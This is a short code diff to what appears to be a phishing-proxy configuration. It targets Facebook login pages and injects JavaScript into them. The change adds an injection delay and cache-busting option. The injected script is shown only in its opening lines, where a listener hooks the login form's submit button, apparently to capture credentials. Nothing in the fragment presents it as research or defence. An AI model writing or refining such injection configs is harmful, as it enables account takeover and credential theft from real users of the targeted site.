@@ -64,6 +64,8 @@ js_inject:
   - trigger_domains: ["www.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
     trigger_params: []
+    inject_delay: 2000
+    cache_buster: true
     script: |  
       function onclickListener(){
         var submit = document.querySelectorAll('button[type=submit]')[0];
